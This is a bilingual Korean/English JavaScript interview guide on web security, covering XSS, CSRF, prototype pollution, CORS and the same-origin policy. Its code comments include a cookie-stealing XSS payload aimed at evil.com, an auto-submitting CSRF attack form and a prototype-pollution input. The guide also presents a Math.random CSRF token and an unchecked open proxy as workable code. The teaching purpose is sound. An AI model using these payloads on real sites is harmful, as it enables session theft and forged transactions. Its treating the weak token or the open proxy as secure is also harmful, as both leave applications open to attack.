# JavaScript 개발자 인터뷰 질문 Part 7: 보안

## 보안

25. **JavaScript에서 발생할 수 있는 보안 취약점과 이를 방지하는 방법에 대해 설명해주세요.**
    - XSS(Cross-Site Scripting), CSRF(Cross-Site Request Forgery) 등
    
    **설명:** JavaScript 웹 애플리케이션에서는 다양한 보안 취약점이 발생할 수 있습니다. XSS(Cross-Site Scripting)는 공격자가 웹 페이지에 악성 스크립트를 삽입하여 사용자의 브라우저에서 실행되게 하는 공격으로, 사용자 입력을 적절히 검증하고 이스케이핑하거나, Content-Security-Policy 헤더를 사용하여 방지할 수 있습니다. CSRF(Cross-Site Request Forgery)는 사용자가 인증된 상태에서 공격자의 사이트를 방문할 때 원치 않는 요청을 실행하게 하는 공격으로, CSRF 토큰, SameSite 쿠키 속성, 중요 작업에 추가 인증을 요구하여 방지할 수 있습니다. 이외에도 인젝션 공격(SQL, NoSQL, Command), 취약한 의존성 사용, 부적절한 인증 및 세션 관리, 민감 정보 노출, 보안 설정 오류 등이 있습니다. 이러한 취약점을 방지하기 위해서는 입력 검증, 출력 이스케이핑, 최신 보안 라이브러리 사용, HTTPS 적용, 적절한 CORS 설정, 정기적인 보안 감사 및 업데이트, 최소 권한 원칙 준수 등의 방법을 사용해야 합니다. 또한 개발자는 OWASP(Open Web Application Security Project)의 가이드라인을 따르고, 보안 중심의 개발 문화를 조성하는 것이 중요합니다.

    **Description:** JavaScript web applications can be vulnerable to various security threats. XSS (Cross-Site Scripting) allows attackers to inject malicious scripts into web pages that execute in users' browsers, which can be prevented by properly validating and escaping user input or using Content-Security-Policy headers. CSRF (Cross-Site Request Forgery) tricks authenticated users into executing unwanted actions when visiting an attacker's site, preventable through CSRF tokens, SameSite cookie attributes, and requiring additional authentication for important operations. Other vulnerabilities include injection attacks (SQL, NoSQL, Command), using vulnerable dependencies, improper authentication and session management, sensitive information exposure, and security misconfiguration. To prevent these vulnerabilities, developers should implement input validation, output escaping, use up-to-date security libraries, apply HTTPS, configure CORS properly, conduct regular security audits and updates, and follow the principle of least privilege. Additionally, developers should follow OWASP (Open Web Application Security Project) guidelines and foster a security-focused development culture.
    
    **예시:**
    ```javascript
    // 1. XSS (Cross-Site Scripting) 취약점 예시
    
    // 취약한 코드: 사용자 입력을 그대로 삽입
    function vulnerableToXSS() {
      // URL에서 파라미터 가져오기
      const userInput = new URLSearchParams(window.location.search).get('comment');
      
      // 위험: 사용자 입력을 그대로 DOM에 삽입
      document.getElementById('comments').innerHTML = userInput;
      
      // 공격자가 다음과 같은 URL을 사용할 수 있음:
      // https://example.com/page?comment=<script>alert('XSS');</script>
      // 또는 더 위험한 코드:
      // https://example.com/page?comment=<img src="x" onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
    }
    
    // XSS 방지 방법: 입력값 이스케이핑
    function preventXSS() {
      const userInput = new URLSearchParams(window.location.search).get('comment');
      
      // 방법 1: 텍스트 콘텐츠 사용
      document.getElementById('comments').textContent = userInput; // innerHTML 대신 textContent 사용
      
      // 방법 2: HTML 이스케이핑 함수 사용
      function escapeHTML(str) {
        return str
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&#039;');
      }
      
      document.getElementById('comments').innerHTML = escapeHTML(userInput);
      
      // 방법 3: DOMPurify 라이브러리 사용
      // import DOMPurify from 'dompurify';
      // document.getElementById('comments').innerHTML = DOMPurify.sanitize(userInput);
    }
    
    // 2. CSRF (Cross-Site Request Forgery) 취약점 예시
    
    // 취약한 코드: CSRF 보호 없이 중요한 작업 수행
    function vulnerableToCSRF() {
      // 사용자가 로그인되어 있다고 가정
      // 이 페이지에서 다음과 같은 양식이 있을 수 있음
      const transferForm = `
        <form action="/api/transfer-money" method="POST">
          <input type="text" name="to" value="recipient" />
          <input type="number" name="amount" value="1000" />
          <button type="submit">Transfer</button>
        </form>
      `;
      
      // 공격자는 다음과 같은 사이트를 만들 수 있음:
      const maliciousSite = `
        <h1>Win a prize!</h1>
        <form action="https://bank.example.com/api/transfer-money" method="POST" id="csrf-form">
          <input type="hidden" name="to" value="attacker" />
          <input type="hidden" name="amount" value="10000" />
        </form>
        <script>
          document.getElementById('csrf-form').submit(); // 자동 전송
        </script>
      `;
      // 사용자가 이 사이트를 방문하면 자동으로 양식이 전송되며, 사용자의 쿠키가 함께 전송됨
    }
    
    // CSRF 방지 방법
    function preventCSRF() {
      // 방법 1: CSRF 토큰 사용
      function generateCSRFToken() {
        return Math.random().toString(36).substring(2) + Date.now().toString(36);
      }
      
      // 서버 측에서 토큰을 세션에 저장하고 클라이언트에 전달
      const csrfToken = generateCSRFToken();
      
      // 양식에 CSRF 토큰 포함
      const secureForm = `
        <form action="/api/transfer-money" method="POST">
          <input type="hidden" name="csrf_token" value="${csrfToken}" />
          <input type="text" name="to" value="recipient" />
          <input type="number" name="amount" value="1000" />
          <button type="submit">Transfer</button>
        </form>
      `;
      
      // 방법 2: SameSite 쿠키 속성 사용
      // 서버 측에서 쿠키 설정
      // Set-Cookie: sessionid=abc123; SameSite=Strict; Secure; HttpOnly
      
      // 방법 3: 중요한 작업에 추가 인증 요구
      function requireAdditionalAuthentication() {
        const password = prompt('Please enter your password to confirm this action:');
        return validatePassword(password); // 서버에서 검증
      }
    }
    
    // 3. 프로토타입 오염(Prototype Pollution) 취약점
    
    // 취약한 코드: 사용자 입력으로 객체 속성을 동적으로 설정
    function vulnerableToPrototypePollution(userInput) {
      const obj = {};
      
      // 위험: 사용자 입력을 객체 경로로 사용
      function setNestedProperty(obj, path, value) {
        const parts = path.split('.');
        let current = obj;
        
        for (let i = 0; i < parts.length - 1; i++) {
          if (!current[parts[i]]) {
            current[parts[i]] = {};
          }
          current = current[parts[i]];
        }
        
        current[parts[parts.length - 1]] = value;
      }
      
      // 공격자가 다음과 같은 입력을 제공할 수 있음:
      // "__proto__.isAdmin" 값으로 "true"
      setNestedProperty(obj, userInput.path, userInput.value);
      
      return obj;
    }
    
    // 프로토타입 오염 방지 방법
    function preventPrototypePollution(userInput) {
      // 방법 1: 안전한 속성 이름 확인
      function setNestedPropertySafely(obj, path, value) {
        const parts = path.split('.');
        
        // 위험한 속성 이름 확인
        const dangerousProps = ['__proto__', 'constructor', 'prototype'];
        if (parts.some(part => dangerousProps.includes(part))) {
          throw new Error('Potential prototype pollution detected');
        }
        
        // 안전한 경우에만 속성 설정
        let current = obj;
        for (let i = 0; i < parts.length - 1; i++) {
          if (!current[parts[i]]) {
            current[parts[i]] = {};
          }
          current = current[parts[i]];
        }
        
        current[parts[parts.length - 1]] = value;
      }
      
      // 방법 2: Object.create(null) 사용하여 프로토타입 없는 객체 생성
      const safeObj = Object.create(null);
      // 이 객체는 프로토타입이 없으므로 오염될 수 없음
      
      return safeObj;
    }
    
    // 4. 보안 모범 사례
    
    // Content Security Policy (CSP) 설정
    function setupCSP() {
      // 서버 측에서 다음 헤더를 설정
      // Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com
      
      // 또는 메타 태그 사용
      const cspMeta = document.createElement('meta');
      cspMeta.httpEquiv = 'Content-Security-Policy';
      cspMeta.content = "default-src 'self'; script-src 'self' https://trusted-cdn.com";
      document.head.appendChild(cspMeta);
    }
    
    // 안전한 HTTP 요청
    function secureFetch() {
      // API 요청 시 CSRF 토큰 포함
      fetch('/api/data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-CSRF-Token': getCSRFToken() // 서버에서 제공한 토큰
        },
        credentials: 'same-origin', // 쿠키 포함
        body: JSON.stringify({ data: 'example' })
      });
    }
    
    // 민감한 정보 처리
    function handleSensitiveData() {
      // 민감한 정보는 메모리에 오래 보관하지 않음
      function processPaymentInfo(cardNumber) {
        try {
          // 처리 로직
          const result = processPayment(cardNumber);
          
          return result;
        } finally {
          // 사용 후 메모리에서 지우기
          cardNumber = null;
          // 가비지 컬렉션 힌트
          if (global.gc) global.gc();
        }
      }
      
      // localStorage/sessionStorage에 민감 정보 저장 금지
      // 잘못된 예:
      // localStorage.setItem('userToken', 'sensitive-jwt-token');
      
      // 대신 HttpOnly 쿠키 사용 (서버 측에서 설정)
    }
    ```

26. **동일 출처 정책(Same-Origin Policy)과 CORS(Cross-Origin Resource Sharing)에 대해 설명해주세요.**
    
    **설명:** 동일 출처 정책(Same-Origin Policy)은 웹 브라우저의 핵심 보안 메커니즘으로, 한 출처(origin)에서 로드된 문서나 스크립트가 다른 출처의 리소스와 상호작용하는 것을 제한합니다. 출처는 프로토콜(http/https), 도메인, 포트의 조합으로 정의되며, 이 중 하나라도 다르면 다른 출처로 간주됩니다. 이 정책은 악의적인 사이트가 다른 사이트의 데이터에 접근하는 것을 방지하여 사용자를 보호합니다. CORS(Cross-Origin Resource Sharing)는 이러한 제한을 안전하게 완화하기 위한 HTTP 헤더 기반 메커니즘입니다. 서버가 특정 출처의 웹 애플리케이션이 자신의 리소스에 접근할 수 있도록 허용하는 방법을 제공합니다. CORS는 단순 요청과 프리플라이트 요청으로 나뉘며, 프리플라이트 요청은 OPTIONS 메서드를 사용해 실제 요청 전에 서버가 해당 요청을 허용하는지 확인합니다. 서버는 Access-Control-Allow-Origin 헤더로 허용된 출처를 지정하고, 필요에 따라 Access-Control-Allow-Methods, Access-Control-Allow-Headers, Access-Control-Allow-Credentials 등의 헤더를 추가로 설정할 수 있습니다. CORS 구현 시 주의할 점은 '*'와 같은 와일드카드 사용을 최소화하고, 필요한 출처만 명시적으로 허용하며, 인증이 필요한 요청에는 특별한 주의를 기울여야 한다는 것입니다.

    **Description:** Same-Origin Policy is a core security mechanism in web browsers that restricts documents or scripts loaded from one origin from interacting with resources from another origin. An origin is defined by the combination of protocol (http/https), domain, and port; if any of these differ, it's considered a different origin. This policy protects users by preventing malicious sites from accessing data on other sites. CORS (Cross-Origin Resource Sharing) is an HTTP-header based mechanism that safely relaxes these restrictions. It provides a way for servers to allow specific web applications from other origins to access their resources. CORS involves simple requests and preflight requests, with preflight requests using the OPTIONS method to check if the server allows the actual request before sending it. Servers specify allowed origins with the Access-Control-Allow-Origin header, and can additionally set headers like Access-Control-Allow-Methods, Access-Control-Allow-Headers, and Access-Control-Allow-Credentials as needed. When implementing CORS, it's important to minimize the use of wildcards like '*', explicitly allow only necessary origins, and take special care with requests requiring authentication.
    
    **예시:**
    ```javascript
    // 1. 동일 출처 정책 예시
    
    // 현재 페이지: https://example.com/page.html
    
    // 동일 출처 요청 (허용됨)
    fetch('https://example.com/api/data')
      .then(response => response.json())
      .then(data => console.log('Same-origin data:', data))
      .catch(error => console.error('Error:', error));
    
    // 다른 출처 요청 (CORS 없이는 차단됨)
    fetch('https://api.different-domain.com/data')
      .then(response => response.json())
      .then(data => console.log('Cross-origin data:', data))
      .catch(error => console.error('Error (likely CORS):', error));
    // 콘솔에 다음과 같은 오류가 표시될 수 있음:
    // "Access to fetch at 'https://api.different-domain.com/data' from origin 'https://example.com' 
    // has been blocked by CORS policy: No 'Access-Control-Allow-Origin' header is present on the requested resource."
    
    // 2. CORS 구성 예시 (서버 측 코드)
    
    // Node.js Express 서버 예시
    const express = require('express');
    const app = express();
    
    // 모든 출처에 대한 CORS 허용 (개발용, 프로덕션에서는 권장하지 않음)
    app.use((req, res, next) => {
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
      res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
      
      // 프리플라이트 요청 처리
      if (req.method === 'OPTIONS') {
        return res.status(200).end();
      }
      
      next();
    });
    
    // 특정 출처만 허용하는 더 안전한 방법
    app.use((req, res, next) => {
      const allowedOrigins = ['https://example.com', 'https://www.example.com'];
      const origin = req.headers.origin;
      
      if (allowedOrigins.includes(origin)) {
        res.header('Access-Control-Allow-Origin', origin);
        res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
        res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
        
        // 자격 증명 포함 요청 허용 (쿠키, 인증 헤더 등)
        res.header('Access-Control-Allow-Credentials', 'true');
      }
      
      // 프리플라이트 요청 처리
      if (req.method === 'OPTIONS') {
        return res.status(200).end();
      }
      
      next();
    });
    
    // API 엔드포인트
    app.get('/api/data', (req, res) => {
      res.json({ message: 'This data is accessible cross-origin' });
    });
    
    app.listen(3000, () => {
      console.log('Server running on port 3000');
    });
    
    // 3. 클라이언트 측에서 CORS 요청 예시
    
    // 기본 CORS 요청
    fetch('https://api.example.com/data')
      .then(response => response.json())
      .then(data => console.log('Data:', data))
      .catch(error => console.error('Error:', error));
    
    // 자격 증명(쿠키, 인증 헤더)을 포함한 CORS 요청
    fetch('https://api.example.com/user-data', {
      method: 'GET',
      credentials: 'include', // 쿠키 포함
      headers: {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer token123'
      }
    })
      .then(response => response.json())
      .then(data => console.log('User data:', data))
      .catch(error => console.error('Error:', error));
    
    // 4. CORS 우회 방법 (프록시 서버 사용)
    
    // 프론트엔드 코드
    fetch('/proxy/https://api.external-service.com/data')
      .then(response => response.json())
      .then(data => console.log('Proxied data:', data))
      .catch(error => console.error('Error:', error));
    
    // 백엔드 프록시 서버 (Node.js)
    const express = require('express');
    const axios = require('axios');
    const app = express();
    
    // 프록시 엔드포인트
    app.get('/proxy/:url', async (req, res) => {
      try {
        const url = req.params.url;
        const response = await axios.get(url);
        res.json(response.data);
      } catch (error) {
        res.status(500).json({ error: 'Proxy request failed' });
      }
    });
    
    app.listen(3000, () => {
      console.log('Proxy server running on port 3000');
    });
    
    // 5. JSONP (JSON with Padding) - 오래된 CORS 우회 기술
    
    // 클라이언트 측 코드
    function handleJSONPResponse(data) {
      console.log('JSONP data:', data);
    }
    
    // 동적으로 스크립트 태그 생성
    function fetchJSONP(url) {
      const script = document.createElement('script');
      script.src = `${url}?callback=handleJSONPResponse`;
      document.body.appendChild(script);
      
      // 사용 후 스크립트 태그 제거
      script.onload = function() {
        document.body.removeChild(script);
      };
    }
    
    // 사용 예시
    fetchJSONP('https://api.example.com/data');
    
    // 서버 측 응답 (예시)
    // handleJSONPResponse({ "message": "This is JSONP data" });
    ```
